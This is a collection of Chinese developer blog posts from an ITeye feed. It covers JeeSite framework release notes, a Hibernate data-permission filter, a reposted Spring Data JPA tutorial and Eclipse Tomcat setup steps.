集成Activiti5.12工作流引擎，提供简单请假的例子
DAO层优化，缓存优化，ERMaster数据建模，增加mssql驱动及建表脚本。
CMS模块增加信息统计分析。
菜单排序批量保存功能。
修正多个Bug。
详细见 Release Notes ： http://jeesite.com/release.html 
已有 12 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
JeeSite数据权限控制解决方案, thinkgem.iteye.com.blog.1871872, Tue, 21 May 2013 14:02:59 +0800

支持如下数据范围设置：
 
所有数据
所在公司及以下数据
所在公司数据
所在部门及以下数据
所在部门数据
仅本人数据
按明细设置（特殊情况下，跨机构授权）
User user = UserUtils.getUser();
// 使用标准查询
DetachedCriteria dc = articleDao.createDetachedCriteria();
dc.createAlias("office", "office").createAlias("user", "user");
dc.add(dataScopeFilter(user, "office", "user"));
List<Entity> list = articleDao.find(page, dc);;
// 使用HQL查询
String hql = "select e from Entity e join e.office o join e.user u where 1=1 ";
hql += dataScopeFilterString(UserUtils.getUser(), "o", "u");
List<Entity> list2 = articleDao.find(page, hql);
 
	/**
	 * 数据范围过滤
	 * @param dc Hibernate标准查询对象
	 * @param user 当前用户对象，通过“UserUtils.getUser()”获取
	 * @param officeAlias 机构表别名，例如：dc.createAlias("office", "office");
	 * @param userAlias 用户表别名，传递空，忽略此参数
	 * @return 标准连接条件对象
	 */
	protected static Junction dataScopeFilter(User user, String officeAlias, String userAlias) {
		// 进行权限过滤，多个角色权限范围之间为或者关系。
		List<String> dataScope = Lists.newArrayList();
		Junction junction = Restrictions.disjunction();
		
		// 超级管理员，跳过权限过滤
		if (!user.isAdmin()){
			for (Role r : user.getRoleList()){
				if (!dataScope.contains(r.getDataScope()) && StringUtils.isNotBlank(officeAlias)){
					boolean isDataScopeAll = false;
					if (Role.DATA_SCOPE_ALL.equals(r.getDataScope())){
						isDataScopeAll = true;
					}
					else if (Role.DATA_SCOPE_COMPANY_AND_CHILD.equals(r.getDataScope())){
						junction.add(Restrictions.eq(officeAlias+".id", user.getCompany().getId()));
						junction.add(Restrictions.like(officeAlias+".parentIds", user.getCompany().getParentIds()+user.getCompany().getId()+",%"));
					}
					else if (Role.DATA_SCOPE_COMPANY.equals(r.getDataScope())){
						junction.add(Restrictions.eq(officeAlias+".id", user.getCompany().getId()));
						junction.add(Restrictions.and(Restrictions.eq(officeAlias+".parent.id", user.getCompany().getId()),
								Restrictions.eq(officeAlias+".type", "2"))); // 包括本公司下的部门
					}
					else if (Role.DATA_SCOPE_OFFICE_AND_CHILD.equals(r.getDataScope())){
						junction.add(Restrictions.eq(officeAlias+".id", user.getOffice().getId()));
						junction.add(Restrictions.like(officeAlias+".parentIds", user.getOffice().getParentIds()+user.getOffice().getId()+",%"));
					}
					else if (Role.DATA_SCOPE_OFFICE.equals(r.getDataScope())){
						junction.add(Restrictions.eq(officeAlias+".id", user.getOffice().getId()));
					}
					else if (Role.DATA_SCOPE_CUSTOM.equals(r.getDataScope())){
						junction.add(Restrictions.in(officeAlias+".id", r.getOfficeIdList()));
					}
					//else if (Role.DATA_SCOPE_SELF.equals(r.getDataScope())){
					if (!isDataScopeAll){
						if (StringUtils.isNotBlank(userAlias)){
							junction.add(Restrictions.eq(userAlias+".id", user.getId()));
						}else {
							junction.add(Restrictions.isNull(officeAlias+".id"));
						}
					}else{
						// 如果包含全部权限，则去掉之前添加的所有条件，并跳出循环。
						junction = Restrictions.disjunction();
						break;
					}
					dataScope.add(r.getDataScope());
				}
			}
		}
		return junction;
	}
	
	/**
	 * 数据范围过滤
	 * @param user 当前用户对象，通过“UserUtils.getUser()”获取
	 * @param officeAlias 机构表别名，例如：dc.createAlias("office", "office");
	 * @param userAlias 用户表别名，传递空，忽略此参数
	 * @return ql查询字符串
	 */
	protected static String dataScopeFilterString(User user, String officeAlias, String userAlias) {
		Junction junction = dataScopeFilter(user, officeAlias, userAlias);
		Iterator<Criterion> it = junction.conditions().iterator();
		StringBuilder ql = new StringBuilder();
		ql.append(" and (");
		if (it.hasNext()){
			ql.append(it.next());
		}
		String[] strField = {".parentIds like ", ".type="}; // 需要给字段增加“单引号”的字段。
		while (it.hasNext()) {
			ql.append(" or (");
			String s = it.next().toString();
			for(String field : strField){
				s = s.replaceAll(field + "(\\w.*)", field + "'$1'");
			}
			ql.append(s).append(")");
		}
		ql.append(")");
		return ql.toString();
	}
 
已有 3 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
JeeSite 企业信息管理系统基础框架 V1.0.2 更新日志, thinkgem.iteye.com.blog.1851001, Sun, 21 Apr 2013 14:41:17 +0800

重要更新：
 
非超级管理员可以管理自己创建的角色，菜单，栏目等。
数据库连接池有bonecp更换为alibaba的druid。
树选择控件增加搜索功能，感谢联柯提供。
菜单管理，修改时可选择图标，不用再输入图标名称了，列表增加图标显示，感谢songlai提供。
Bootstrap升级至2.3.1，登录界面小改版，可切换主题样式（内置5中主题）默认主题依然兼容ie6。前端网站改版，支持两种主题。
Excel导出导入组件完善，导出模板可添加批注。
增加验证码Tag标签（validateCode.tag）。
Page分页获取总条数时，去去掉order by条件。
字符串截取问题，支持中英文处理。
详细见 Release Notes ： http://jeesite.com/release.html
已有 9 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
JeeSite 界面截图（5种内置主题）, thinkgem.iteye.com.blog.1844437, Tue, 09 Apr 2013 20:08:05 +0800

 
项目地址：http://jeesite.com
 
                  
已有 2 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
使用 Spring Data JPA 简化 JPA 开发, thinkgem.iteye.com.blog.1842418, Fri, 05 Apr 2013 20:48:32 +0800

原文：http://www.ibm.com/developerworks/cn/opensource/os-cn-spring-jpa/
 
从一个简单的 JPA 示例开始
本文主要讲述 Spring Data JPA，但是为了不至于给 JPA 和 Spring 的初学者造成较大的学习曲线，我们首先从 JPA 开始，简单介绍一个 JPA 示例；接着重构该示例，并引入 Spring 框架，这两部分不会涉及过多的篇幅，如果希望能够深入学习 Spring 和 JPA，可以根据本文最后提供的参考资料进一步学习。
自 JPA 伴随 Java EE 5 发布以来，受到了各大厂商及开源社区的追捧，各种商用的和开源的 JPA 框架如雨后春笋般出现，为开发者提供了丰富的选择。它一改之前 EJB 2.x 中实体 Bean 笨重且难以使用的形象，充分吸收了在开源社区已经相对成熟的 ORM 思想。另外，它并不依赖于 EJB 容器，可以作为一个独立的持久层技术而存在。目前比较成熟的 JPA 框架主要包括 Jboss 的 Hibernate EntityManager、Oracle 捐献给 Eclipse 社区的 EclipseLink、Apache 的 OpenJPA 等。
本文的示例代码基于 Hibernate EntityManager 开发，但是读者几乎不用修改任何代码，便可以非常容易地切换到其他 JPA 框架，因为代码中使用到的都是 JPA 规范提供的接口 / 类，并没有使用到框架本身的私有特性。示例主要涉及七个文件，但是很清晰：业务层包含一个接口和一个实现；持久层包含一个接口、一个实现、一个实体类；另外加上一个 JPA 配置文件和一个测试类。相关类 / 接口代码如下：
清单 1. 实体类 AccountInfo.java
				
 @Entity 
 @Table(name = "t_accountinfo") 
 public class AccountInfo implements Serializable { 
 private Long accountId; 
 private Integer balance; 
 // 此处省略 getter 和 setter 方法。
 } 
清单 2. 业务层接口 UserService.java
				
 public interface UserService { 
 public AccountInfo createNewAccount(String user, String pwd, Integer init); 
 } 
清单 3. 业务层的实现类 UserServiceImpl.java
				
 public class UserServiceImpl implements UserService { 
 private UserDao userDao = new UserDaoImpl(); 
 public AccountInfo createNewAccount(String user, String pwd, Integer init){ 
 // 封装域对象
 AccountInfo accountInfo = new AccountInfo(); 
 UserInfo userInfo = new UserInfo(); 
 userInfo.setUsername(username); 
 userInfo.setPassword(password); 
 accountInfo.setBalance(initBalance); 
 accountInfo.setUserInfo(userInfo); 
 // 调用持久层，完成数据的保存
 return userDao.save(accountInfo); 
    } 
 } 
清单 4. 持久层接口
				
 public interface UserDao { 
 public AccountInfo save(AccountInfo accountInfo); 
 } 
清单 5. 持久层的实现类
				
 public class UserDaoImpl implements UserDao { 
 public AccountInfo save(AccountInfo accountInfo) { 
 EntityManagerFactory emf = 
 Persistence.createEntityManagerFactory("SimplePU"); 
 EntityManager em = emf.createEntityManager(); 
 em.getTransaction().begin(); 
 em.persist(accountInfo); 
 em.getTransaction().commit(); 
 emf.close(); 
 return accountInfo; 
    } 
 } 
清单 6. JPA 标准配置文件 persistence.xml
				
 <?xml version="1.0" encoding="UTF-8"?> 
 <persistence xmlns="http://java.sun.com/xml/ns/persistence" version="2.0"> 
 <persistence-unit name="SimplePU" transaction-type="RESOURCE_LOCAL"> 
 <provider>org.hibernate.ejb.HibernatePersistence</provider> 
 <class>footmark.springdata.jpa.domain.UserInfo</class> 
 <class>footmark.springdata.jpa.domain.AccountInfo</class> 
 <properties> 
 <property name="hibernate.connection.driver_class"
 value="com.mysql.jdbc.Driver"/> 
 <property name="hibernate.connection.url" 
 value="jdbc:mysql://10.40.74.197:3306/zhangjp"/> 
 <property name="hibernate.connection.username" value="root"/> 
 <property name="hibernate.connection.password" value="root"/> 
 <property name="hibernate.dialect"
 value="org.hibernate.dialect.MySQL5Dialect"/> 
 <property name="hibernate.show_sql" value="true"/> 
 <property name="hibernate.format_sql" value="true"/> 
 <property name="hibernate.use_sql_comments" value="false"/> 
 <property name="hibernate.hbm2ddl.auto" value="update"/> 
 </properties> 
 </persistence-unit> 
 </persistence> 
清单 7. 本文使用如下的 main 方法进行开发者测试
				
 public class SimpleSpringJpaDemo { 
    public static void main(String[] args) { 
        new UserServiceImpl().createNewAccount("ZhangJianPing", "123456", 1); 
    } 
 } 
 
 
回页首
简述 Spring 框架对 JPA 的支持
接下来我们引入 Spring，以展示 Spring 框架对 JPA 的支持。业务层接口 UserService 保持不变，UserServiceImpl 中增加了三个注解，以让 Spring 完成依赖注入，因此不再需要使用 new 操作符创建 UserDaoImpl 对象了。同时我们还使用了 Spring 的声明式事务：
清单 8. 配置为 Spring Bean 的业务层实现
				
 @Service("userService") 
 public class UserServiceImpl implements UserService { 
 @Autowired 
 private UserDao userDao; 
 @Transactional 
 public AccountInfo createNewAccount( 
 String name, String pwd, Integer init) { …… } 
 } 
 
对于持久层，UserDao 接口也不需要修改，只需修改 UserDaoImpl 实现，修改后的代码如下：
清单 9. 配置为 Spring Bean 的持久层实现
				
 @Repository("userDao") 
 public class UserDaoImpl implements UserDao { 
 @PersistenceContext 
 private EntityManager em; 
 @Transactional 
   public Long save(AccountInfo accountInfo) { 
 em.persist(accountInfo); 
 return accountInfo.getAccountId(); 
 } 
 } 
清单 10. Spring 配置文件
				
 <?xml version="1.0" encoding="UTF-8"?> 
 <beans...> 
 <context:component-scan base-package="footmark.springdata.jpa"/> 
 <tx:annotation-driven transaction-manager="transactionManager"/> 
 <bean id="transactionManager" 
 class="org.springframework.orm.jpa.JpaTransactionManager"> 
 <property name="entityManagerFactory" ref="entityManagerFactory"/> 
 </bean> 
 <bean id="entityManagerFactory" class= 
"org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean"> 
    </bean> 
 </beans> 
清单 11. 改造后的基于 Spring 的开发者测试代码
				
 public class SimpleSpringJpaDemo{ 
 public static void main(String[] args){ 
 ClassPathXmlApplicationContext ctx = 
 new ClassPathXmlApplicationContext("spring-demo-cfg.xml"); 
 UserDao userDao = ctx.getBean("userDao", UserDao.class); 
 userDao.createNewAccount("ZhangJianPing", "123456", 1); 
 } 
 } 
 
通过对比重构前后的代码，可以发现 Spring 对 JPA 的简化已经非常出色了，我们可以大致总结一下 Spring 框架对 JPA 提供的支持主要体现在如下几个方面：
首先，它使得 JPA 配置变得更加灵活。JPA 规范要求，配置文件必须命名为 persistence.xml，并存在于类路径下的 META-INF 目录中。该文件通常包含了初始化 JPA 引擎所需的全部信息。Spring 提供的 LocalContainerEntityManagerFactoryBean 提供了非常灵活的配置，persistence.xml 中的信息都可以在此以属性注入的方式提供。
其次，Spring 实现了部分在 EJB 容器环境下才具有的功能，比如对 @PersistenceContext、@PersistenceUnit 的容器注入支持。
第三，也是最具意义的，Spring 将 EntityManager 的创建与销毁、事务管理等代码抽取出来，并由其统一管理，开发者不需要关心这些，如前面的代码所示，业务方法中只剩下操作领域对象的代码，事务管理和 EntityManager 创建、销毁的代码都不再需要开发者关心了。
 
回页首
更进一步：Spring Data JPA 让一切近乎完美
通过前面的分析可以看出，Spring 对 JPA 的支持已经非常强大，开发者只需关心核心业务逻辑的实现代码，无需过多关注 EntityManager 的创建、事务处理等 JPA 相关的处理，这基本上也是作为一个开发框架而言所能做到的极限了。然而，Spring 开发小组并没有止步，他们再接再厉，于最近推出了 Spring Data JPA 框架，主要针对的就是 Spring 唯一没有简化到的业务逻辑代码，至此，开发者连仅剩的实现持久层业务逻辑的工作都省了，唯一要做的，就只是声明持久层的接口，其他都交给 Spring Data JPA 来帮你完成！
至此，读者可能会存在一个疑问，框架怎么可能代替开发者实现业务逻辑呢？毕竟，每一个应用的持久层业务甚至领域对象都不尽相同，框架是怎么做到的呢？其实这背后的思想并不复杂，比如，当你看到 UserDao.findUserById() 这样一个方法声明，大致应该能判断出这是根据给定条件的 ID 查询出满足条件的 User 对象。Spring Data JPA 做的便是规范方法的名字，根据符合规范的名字来确定方法需要实现什么样的逻辑。
接下来我们针对前面的例子进行改造，让 Spring Data JPA 来帮助我们完成业务逻辑。在着手写代码之前，开发者需要先 下载Spring Data JPA 的发布包（需要同时下载 Spring Data Commons 和 Spring Data JPA 两个发布包，Commons 是 Spring Data 的公共基础包），并把相关的依赖 JAR 文件加入到 CLASSPATH 中。
首先，让持久层接口 UserDao 继承 Repository 接口。该接口使用了泛型，需要为其提供两个类型：第一个为该接口处理的域对象类型，第二个为该域对象的主键类型。修改后的 UserDao 如下：
清单 12. Spring Data JPA 风格的持久层接口
				
 public interface UserDao extends Repository<AccountInfo, Long> { 
    public AccountInfo save(AccountInfo accountInfo); 
 } 
 
然后删除 UserDaoImpl 类，因为我们前面说过，框架会为我们完成业务逻辑。最后，我们需要在 Spring 配置文件中增加如下配置，以使 Spring 识别出需要为其实现的持久层接口：
清单 13. 在 Spring 配置文件中启用扫描并自动创建代理的功能
				
 <-- 需要在 <beans> 标签中增加对 jpa 命名空间的引用 --> 
 <jpa:repositories base-package="footmark.springdata.jpa.dao"
 entity-manager-factory-ref="entityManagerFactory" 
 transaction-manager-ref="transactionManager"/> 
 
至此便大功告成了！执行一下测试代码，然后看一下数据库，新的数据已经如我们预期的添加到表中了。如果要再增加新的持久层业务，比如希望查询出给 ID 的 AccountInfo 对象，该怎么办呢？很简单，在 UserDao 接口中增加一行代码即可：
清单 14. 修改后的持久层接口，增加一个方法声明
				
 public interface UserDao extends Repository<AccountInfo, Long> { 
 public AccountInfo save(AccountInfo accountInfo); 
 // 你需要做的，仅仅是新增如下一行方法声明
 public AccountInfo findByAccountId(Long accountId); 
 } 
 
下面总结一下使用 Spring Data JPA 进行持久层开发大致需要的三个步骤：
声明持久层的接口，该接口继承 Repository，Repository 是一个标记型接口，它不包含任何方法，当然如果有需要，Spring Data 也提供了若干 Repository 子接口，其中定义了一些常用的增删改查，以及分页相关的方法。
在接口中声明需要的业务方法。Spring Data 将根据给定的策略（具体策略稍后讲解）来为其生成实现代码。
在 Spring 配置文件中增加一行声明，让 Spring 为声明的接口创建代理对象。配置了 <jpa:repositories> 后，Spring 初始化容器时将会扫描 base-package 指定的包目录及其子目录，为继承 Repository 或其子接口的接口创建代理对象，并将代理对象注册为 Spring Bean，业务层便可以通过 Spring 自动封装的特性来直接使用该对象。
此外，<jpa:repository> 还提供了一些属性和子标签，便于做更细粒度的控制。可以在 <jpa:repository> 内部使用 <context:include-filter>、<context:exclude-filter> 来过滤掉一些不希望被扫描到的接口。具体的使用方法见 Spring参考文档。
应该继承哪个接口？
前面提到，持久层接口继承 Repository 并不是唯一选择。Repository 接口是 Spring Data 的一个核心接口，它不提供任何方法，开发者需要在自己定义的接口中声明需要的方法。与继承 Repository 等价的一种方式，就是在持久层接口上使用 @RepositoryDefinition 注解，并为其指定 domainClass 和 idClass 属性。如下两种方式是完全等价的：
清单 15. 两种等价的继承接口方式示例
				
 public interface UserDao extends Repository<AccountInfo, Long> { …… } 
 @RepositoryDefinition(domainClass = AccountInfo.class, idClass = Long.class) 
 public interface UserDao { …… } 
 
如果持久层接口较多，且每一个接口都需要声明相似的增删改查方法，直接继承 Repository 就显得有些啰嗦，这时可以继承 CrudRepository，它会自动为域对象创建增删改查方法，供业务层直接使用。开发者只是多写了 "Crud" 四个字母，即刻便为域对象提供了开箱即用的十个增删改查方法。
但是，使用 CrudRepository 也有副作用，它可能暴露了你不希望暴露给业务层的方法。比如某些接口你只希望提供增加的操作而不希望提供删除的方法。针对这种情况，开发者只能退回到 Repository 接口，然后到 CrudRepository 中把希望保留的方法声明复制到自定义的接口中即可。
分页查询和排序是持久层常用的功能，Spring Data 为此提供了 PagingAndSortingRepository 接口，它继承自 CrudRepository 接口，在 CrudRepository 基础上新增了两个与分页有关的方法。但是，我们很少会将自定义的持久层接口直接继承自 PagingAndSortingRepository，而是在继承 Repository 或 CrudRepository 的基础上，在自己声明的方法参数列表最后增加一个 Pageable 或 Sort 类型的参数，用于指定分页或排序信息即可，这比直接使用 PagingAndSortingRepository 提供了更大的灵活性。
JpaRepository 是继承自 PagingAndSortingRepository 的针对 JPA 技术提供的接口，它在父接口的基础上，提供了其他一些方法，比如 flush()，saveAndFlush()，deleteInBatch() 等。如果有这样的需求，则可以继承该接口。
上述四个接口，开发者到底该如何选择？其实依据很简单，根据具体的业务需求，选择其中之一。笔者建议在通常情况下优先选择 Repository 接口。因为 Repository 接口已经能满足日常需求，其他接口能做到的在 Repository 中也能做到，彼此之间并不存在功能强弱的问题。只是 Repository 需要显示声明需要的方法，而其他则可能已经提供了相关的方法，不需要再显式声明，但如果对 Spring Data JPA 不熟悉，别人在检视代码或者接手相关代码时会有疑惑，他们不明白为什么明明在持久层接口中声明了三个方法，而在业务层使用该接口时，却发现有七八个方法可用，从这个角度而言，应该优先考虑使用 Repository 接口。
前面提到，Spring Data JPA 在后台为持久层接口创建代理对象时，会解析方法名字，并实现相应的功能。除了通过方法名字以外，它还可以通过如下两种方式指定查询语句：
Spring Data JPA 可以访问 JPA 命名查询语句。开发者只需要在定义命名查询语句时，为其指定一个符合给定格式的名字，Spring Data JPA 便会在创建代理对象时，使用该命名查询语句来实现其功能。
开发者还可以直接在声明的方法上面使用 @Query 注解，并提供一个查询语句作为参数，Spring Data JPA 在创建代理对象时，便以提供的查询语句来实现其功能。
下面我们分别讲述三种创建查询的方式。
通过解析方法名创建查询
通过前面的例子，读者基本上对解析方法名创建查询的方式有了一个大致的了解，这也是 Spring Data JPA 吸引开发者的一个很重要的因素。该功能其实并非 Spring Data JPA 首创，而是源自一个开源的 JPA 框架 Hades，该框架的作者 Oliver Gierke 本身又是 Spring Data JPA 项目的 Leader，所以把 Hades 的优势引入到 Spring Data JPA 也就是顺理成章的了。
框架在进行方法名解析时，会先把方法名多余的前缀截取掉，比如 find、findBy、read、readBy、get、getBy，然后对剩下部分进行解析。并且如果方法的最后一个参数是 Sort 或者 Pageable 类型，也会提取相关的信息，以便按规则进行排序或者分页查询。
在创建查询时，我们通过在方法名中使用属性名称来表达，比如 findByUserAddressZip ()。框架在解析该方法时，首先剔除 findBy，然后对剩下的属性进行解析，详细规则如下（此处假设该方法针对的域对象为 AccountInfo 类型）：
先判断 userAddressZip （根据 POJO 规范，首字母变为小写，下同）是否为 AccountInfo 的一个属性，如果是，则表示根据该属性进行查询；如果没有该属性，继续第二步；
从右往左截取第一个大写字母开头的字符串（此处为 Zip），然后检查剩下的字符串是否为 AccountInfo 的一个属性，如果是，则表示根据该属性进行查询；如果没有该属性，则重复第二步，继续从右往左截取；最后假设 user 为 AccountInfo 的一个属性；
接着处理剩下部分（ AddressZip ），先判断 user 所对应的类型是否有 addressZip 属性，如果有，则表示该方法最终是根据 "AccountInfo.user.addressZip" 的取值进行查询；否则继续按照步骤 2 的规则从右往左截取，最终表示根据 "AccountInfo.user.address.zip" 的值进行查询。
可能会存在一种特殊情况，比如 AccountInfo 包含一个 user 的属性，也有一个 userAddress 属性，此时会存在混淆。读者可以明确在属性之间加上 "_" 以显式表达意图，比如 "findByUser_AddressZip()" 或者 "findByUserAddress_Zip()"。
在查询时，通常需要同时根据多个属性进行查询，且查询的条件也格式各样（大于某个值、在某个范围等等），Spring Data JPA 为此提供了一些表达条件查询的关键字，大致如下：
And --- 等价于 SQL 中的 and 关键字，比如 findByUsernameAndPassword(String user, Striang pwd)；
Or --- 等价于 SQL 中的 or 关键字，比如 findByUsernameOrAddress(String user, String addr)；
Between --- 等价于 SQL 中的 between 关键字，比如 findBySalaryBetween(int max, int min)；
LessThan --- 等价于 SQL 中的 "<"，比如 findBySalaryLessThan(int max)；
GreaterThan --- 等价于 SQL 中的">"，比如 findBySalaryGreaterThan(int min)；
IsNull --- 等价于 SQL 中的 "is null"，比如 findByUsernameIsNull()；
IsNotNull --- 等价于 SQL 中的 "is not null"，比如 findByUsernameIsNotNull()；
NotNull --- 与 IsNotNull 等价；
Like --- 等价于 SQL 中的 "like"，比如 findByUsernameLike(String user)；
NotLike --- 等价于 SQL 中的 "not like"，比如 findByUsernameNotLike(String user)；
OrderBy --- 等价于 SQL 中的 "order by"，比如 findByUsernameOrderBySalaryAsc(String user)；
Not --- 等价于 SQL 中的 "！ ="，比如 findByUsernameNot(String user)；
In --- 等价于 SQL 中的 "in"，比如 findByUsernameIn(Collection<String> userList) ，方法的参数可以是 Collection 类型，也可以是数组或者不定长参数；
NotIn --- 等价于 SQL 中的 "not in"，比如 findByUsernameNotIn(Collection<String> userList) ，方法的参数可以是 Collection 类型，也可以是数组或者不定长参数；
使用 @Query 创建查询
@Query 注解的使用非常简单，只需在声明的方法上面标注该注解，同时提供一个 JP QL 查询语句即可，如下所示：
清单 16. 使用 @Query 提供自定义查询语句示例
				
 public interface UserDao extends Repository<AccountInfo, Long> { 
 @Query("select a from AccountInfo a where a.accountId = ?1") 
 public AccountInfo findByAccountId(Long accountId); 
    @Query("select a from AccountInfo a where a.balance > ?1") 
 public Page<AccountInfo> findByBalanceGreaterThan( 
 Integer balance,Pageable pageable); 
 } 
 
很多开发者在创建 JP QL 时喜欢使用命名参数来代替位置编号，@Query 也对此提供了支持。JP QL 语句中通过": 变量"的格式来指定参数，同时在方法的参数前面使用 @Param 将方法参数与 JP QL 中的命名参数对应，示例如下：
清单 17. @Query 支持命名参数示例
				
 public interface UserDao extends Repository<AccountInfo, Long> { 
 public AccountInfo save(AccountInfo accountInfo); 
 @Query("from AccountInfo a where a.accountId = :id") 
 public AccountInfo findByAccountId(@Param("id")Long accountId); 
   @Query("from AccountInfo a where a.balance > :balance") 
   public Page<AccountInfo> findByBalanceGreaterThan( 
 @Param("balance")Integer balance,Pageable pageable); 
 } 
 
此外，开发者也可以通过使用 @Query 来执行一个更新操作，为此，我们需要在使用 @Query 的同时，用 @Modifying 来将该操作标识为修改查询，这样框架最终会生成一个更新的操作，而非查询。如下所示：
清单 18. 使用 @Modifying 将查询标识为修改查询
				
 @Modifying 
 @Query("update AccountInfo a set a.salary = ?1 where a.salary < ?2") 
 public int increaseSalary(int after, int before); 
 
通过调用 JPA 命名查询语句创建查询
命名查询是 JPA 提供的一种将查询语句从方法体中独立出来，以供多个方法共用的功能。Spring Data JPA 对命名查询也提供了很好的支持。用户只需要按照 JPA 规范在 orm.xml 文件或者在代码中使用 @NamedQuery（或 @NamedNativeQuery）定义好查询语句，唯一要做的就是为该语句命名时，需要满足”DomainClass.methodName()”的命名规则。假设定义了如下接口：
清单 19. 使用 JPA 命名查询时，声明接口及方法时不需要什么特殊处理
				
 public interface UserDao extends Repository<AccountInfo, Long> { 
 ...... 
   
 public List<AccountInfo> findTop5(); 
 } 
 
如果希望为 findTop5() 创建命名查询，并与之关联，我们只需要在适当的位置定义命名查询语句，并将其命名为 "AccountInfo.findTop5"，框架在创建代理类的过程中，解析到该方法时，优先查找名为 "AccountInfo.findTop5" 的命名查询定义，如果没有找到，则尝试解析方法名，根据方法名字创建查询。
创建查询的顺序
Spring Data JPA 在为接口创建代理对象时，如果发现同时存在多种上述情况可用，它该优先采用哪种策略呢？为此，<jpa:repositories> 提供了 query-lookup-strategy 属性，用以指定查找的顺序。它有如下三个取值：
create --- 通过解析方法名字来创建查询。即使有符合的命名查询，或者方法通过 @Query 指定的查询语句，都将会被忽略。
create-if-not-found --- 如果方法通过 @Query 指定了查询语句，则使用该语句实现查询；如果没有，则查找是否定义了符合条件的命名查询，如果找到，则使用该命名查询；如果两者都没有找到，则通过解析方法名字来创建查询。这是 query-lookup-strategy 属性的默认值。
use-declared-query --- 如果方法通过 @Query 指定了查询语句，则使用该语句实现查询；如果没有，则查找是否定义了符合条件的命名查询，如果找到，则使用该命名查询；如果两者都没有找到，则抛出异常。
Spring Data JPA 对事务的支持
默认情况下，Spring Data JPA 实现的方法都是使用事务的。针对查询类型的方法，其等价于 @Transactional(readOnly=true)；增删改类型的方法，等价于 @Transactional。可以看出，除了将查询的方法设为只读事务外，其他事务属性均采用默认值。
如果用户觉得有必要，可以在接口方法上使用 @Transactional 显式指定事务属性，该值覆盖 Spring Data JPA 提供的默认值。同时，开发者也可以在业务层方法上使用 @Transactional 指定事务属性，这主要针对一个业务层方法多次调用持久层方法的情况。持久层的事务会根据设置的事务传播行为来决定是挂起业务层事务还是加入业务层的事务。具体 @Transactional 的使用，请参考Spring的参考文档。
为接口中的部分方法提供自定义实现
有些时候，开发者可能需要在某些方法中做一些特殊的处理，此时自动生成的代理对象不能完全满足要求。为了享受 Spring Data JPA 带给我们的便利，同时又能够为部分方法提供自定义实现，我们可以采用如下的方法：
将需要开发者手动实现的方法从持久层接口（假设为 AccountDao ）中抽取出来，独立成一个新的接口（假设为 AccountDaoPlus ），并让 AccountDao 继承 AccountDaoPlus；
为 AccountDaoPlus 提供自定义实现（假设为 AccountDaoPlusImpl ）；
将 AccountDaoPlusImpl 配置为 Spring Bean；
在 <jpa:repositories> 中按清单 19 的方式进行配置。
清单 20. 指定自定义实现类
				
 <jpa:repositories base-package="footmark.springdata.jpa.dao"> 
 <jpa:repository id="accountDao" repository-impl-ref=" accountDaoPlus " /> 
 </jpa:repositories> 
 <bean id="accountDaoPlus" class="......."/> 
 
此外，<jpa:repositories > 提供了一个 repository-impl-postfix 属性，用以指定实现类的后缀。假设做了如下配置：
清单 21. 设置自动查找时默认的自定义实现类命名规则
				
 <jpa:repositories base-package="footmark.springdata.jpa.dao"
 repository-impl-postfix="Impl"/> 
 
则在框架扫描到 AccountDao 接口时，它将尝试在相同的包目录下查找 AccountDaoImpl.java，如果找到，便将其中的实现方法作为最终生成的代理类中相应方法的实现。
 
回页首
结束语
本文主要介绍了 Spring Data JPA 的使用，以及它与 Spring 框架的无缝集成。Spring Data JPA 其实并不依赖于 Spring 框架，有兴趣的读者可以参考本文最后的"参考资源"进一步学习。
 
 
回页首
下载
描述
名字
大小
下载方法
样例代码
sample-code.rar
5KB
HTTP
关于下载方法的信息
 
参考资料
学习
访问 Spring Data 主页，了解 Spring Data 框架及其针对不同的持久化技术提供的支持，这里也提供了丰富的学习文档，并且可以下载最新的 Spring Data JPA 发布版。
参与 Spring Data 论坛，在这里，你可以与世界各地的开发者交流，你提出的问题也会在第一时间得到解答。
Spring Data JPA 的项目负责人写的 一篇指导开发者入门的文章。可以把它作为学习 Spring Data JPA 框架的一个起点。
下载 SpringSource Tool Suite，这是 SpringSource 提供的一款基于 Eclipse 的免费 IDE，为开发 Spring 应用提供了强大的支持。
随时关注 developerWorks 技术活动和网络广播。 
访问 developerWorks Open source 专区获得丰富的 how-to 信息、工具和项目更新以及最受欢迎的文章和教程，帮助您用开放源码技术进行开发，并将它们与 IBM 产品结合使用。
讨论
加入 developerWorks 中文社区，developerWorks 社区是一个面向全球 IT 专业人员，可以提供博客、书签、wiki、群组、联系、共享和协作等社区功能的专业社交网络社区。
加入 IBM 软件下载与技术交流群组，参与在线交流。
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
eclipse 3.6.1 搭建 tomcat 7 web 开发环境, thinkgem.iteye.com.blog.1842228, Fri, 05 Apr 2013 14:21:33 +0800

不少朋友问我eclipse下如何进行tomcat开发，部署项目，于是网上搜了一篇文章，看写的还不错，转载过来了供大家参考。
 
原文地址：http://hi.baidu.com/81667/item/29756a300b6413c5392ffaf8
 
打开 eclipse 菜单 Window -> Preferences -> Server -> Runtime Environment
 点击 “Add...”按钮 添加 Tomcat 服务器
 
 点击"Next" 按钮
 点击 "Finish" 按钮,完成 server 的添加工作
 双击"Tomcat v7.0 Server at localhost.server" 配置tomcat 服务器勾选 Server Options 的前两个选项Serve modules without publishingPublish module contexts to separate XML files保存配置即可。现在新建一个 Dynamic Web Project 项目来看看效果
 点击"Finish" 按钮完成项目创建
 创建一个 html 首页
  按"Next" 按钮下一步 完成web项目发布,运行tomcat 服务器 
运行效果如下图 以上的操作顺序是我成功建立WEB项目之后重新配置的结果有点乱，可以把TOMCAT SERVER 删除重建，在WEB项目上右单击“Run as” -> "Run on server" -> 选择tomcat做为默认服务器即可，效果如下，不会出现一堆server 配置列表，详细操作不多写了，自己动手试一下就明白了。 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
JeeSite 企业信息管理系统基础框架 V1.0.1 发布了, thinkgem.iteye.com.blog.1838516, Fri, 29 Mar 2013 11:10:45 +0800

